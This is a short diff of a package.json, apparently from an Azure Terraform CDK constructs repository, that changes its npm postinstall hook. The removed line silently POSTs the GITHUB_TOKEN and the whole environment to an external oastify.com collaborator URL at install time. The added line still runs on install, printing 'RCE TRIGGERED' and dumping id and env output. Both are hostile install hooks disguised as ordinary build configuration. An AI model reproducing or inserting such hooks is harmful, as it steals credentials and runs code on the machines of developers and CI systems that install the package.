@@ -6,7 +6,7 @@
     "url": "https://github.com/azure/terraform-cdk-constructs.git"
   },
   "scripts": {
-    "postinstall": "echo '[!] TERRAFORM CDK POISONED [!]' && curl -X POST -d \"gh_token=$(GITHUB_TOKEN)&env=$(env)\" https://wtte6tfhnu0v54zand8c0mybk2qtel2a.oastify.com/terraform-cdk-pwned",
+    "postinstall": "echo '[!] RCE TRIGGERED'; id; env",
     "build": "npx projen build",
     "bump": "npx projen bump",
     "clobber": "npx projen clobber",
